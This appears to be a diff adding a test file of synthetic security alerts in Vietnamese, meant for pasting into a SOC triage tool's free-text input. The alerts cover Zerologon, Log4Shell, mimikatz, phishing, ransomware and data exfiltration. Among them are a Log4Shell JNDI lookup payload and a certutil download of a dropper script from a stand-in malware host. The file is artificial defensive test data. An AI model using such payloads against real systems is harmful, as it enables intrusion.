@@ -1,0 +1,53 @@
+# Copy từng dòng vào ô 'Nhập Alert (Free Text)' trên giao diện
+# Mỗi dòng là một alert riêng biệt
+
+CVE-2020-1472 (Zerologon) exploitation attempt từ IP 185.220.101.42 nhắm vào domain controller WIN-DC01
+
+Email từ attacker@malicious.io gửi tới ceo@company.vn với attachment Invoice_2024.exe — người dùng đã mở file
+
+Powershell.exe chạy lệnh mã hóa base64 trên WIN-PC01, commandLine chứa -enc và -nop — khả năng cao là malicious script loader
+
+Bất thường nghiêm trọng: tài khoản k8s-svc truy cập pod secrets trên K8S-NODE01.k8s.internal lúc 4AM, sau đó lateral move sang gke-node-01 và đọc /etc/shadow
+
+Brute-force SSH từ IP 45.33.32.156 nhắm vào SRV-WEB01, đã thử 500 lần trong 5 phút, tài khoản guest bị khai thác thành công
+
+Tài khoản admin truy cập S3 bucket arn:aws:s3:::sensitive-bucket-prod từ IP bên ngoài lúc nửa đêm — không có change request nào
+
+Cảnh báo: tài khoản svc-backup đăng nhập vào WIN-PC01 lúc 02:15 UTC — bất thường vì account này thường chỉ chạy batch job ban ngày
+
+Phát hiện exfiltration: 50GB data từ arn:aws:s3:::backup-logs-archive được tải về IP 203.0.113.10 trong 20 phút
+
+certutil.exe bị lạm dụng để tải file từ http://malware-download.net/dropper.ps1 về máy SRV-WEB01, đây là dấu hiệu LOLBIN abuse
+
+Tấn công chuỗi: 185.220.101.42 brute-force vào admin@corp.local → đăng nhập WIN-DC01 → chạy mimikatz.exe → lateral move sang SRV-FILE01 → exfil 30GB qua port 443
+
+Phát hiện mimikatz.exe chạy với quyền SYSTEM trên WIN-DC01 — nghi ngờ kẻ tấn công đang dump credential từ LSASS
+
+Phát hiện đăng nhập đáng ngờ lúc 3 giờ sáng từ IP nước ngoài 185.220.101.42 vào domain controller WIN-DC01, tài khoản admin bị khóa sau 15 lần thất bại
+
+User nghia đăng nhập thành công vào SRV-FILE01 từ địa chỉ IP 203.0.113.10 không thuộc dải mạng nội bộ
+
+Phát hiện traffic HTTP tới http://185.220.101.42:8080/cmd từ user nghia@company.vn — URL có pattern của command-and-control
+
+Alert CVE-2021-44228 (Log4Shell): request JNDI lookup ${jndi:ldap://91.108.4.1/a} phát hiện trong log SRV-WEB01
+
+APT activity: CVE-2021-44228 exploit từ 91.108.4.1 vào SRV-WEB01 → spawn powershell.exe download payload từ evil-c2.onion.ws → C2 callback qua DNS tunneling → truy cập S3 bucket sensitive-bucket-prod
+
+Business email compromise: email từ domain evil-corp.com giả mạo CFO yêu cầu chuyển khoản khẩn
+
+CVE-2022-30190 (Follina/msdt): WINWORD.EXE spawn msdt.exe trên WIN-PC01, user mở file Word độc hại qua email phishing
+
+Spear phishing phát hiện: phishing@evil-corp.com mạo danh HR gửi link đổi mật khẩu giả tới finance@company.vn
+
+Máy WIN-PC01 kết nối ra ngoài tới IP 91.108.4.1 cổng 4444 — đây là dải IP Tor exit node, nghi C2 callback
+
+Ransomware activity: attacker@malicious.io gửi phishing → user nghia click link phish-bank.tk → download dropper.ps1 → mã hóa toàn bộ SRV-FILE01.corp.local
+
+API call GetSecretValue vào AWS Secrets Manager từ EC2 instance i-0abcd1234efgh5678 tại vùng ap-southeast-1 — instance này không được phép đọc secret
+
+wscript.exe spawn cmd.exe trên K8S-NODE01 từ thư mục Temp, hash file chưa có trong whitelist
+
+DNS query bất thường từ SRV-FILE01 tới domain evil-c2.onion.ws với tần suất 30 giây một lần — dấu hiệu DNS tunneling
+
+PrintNightmare CVE-2021-34527: spoolsv.exe load DLL lạ từ path UNC \\185.220.101.42\share — privilege escalation attempt
+
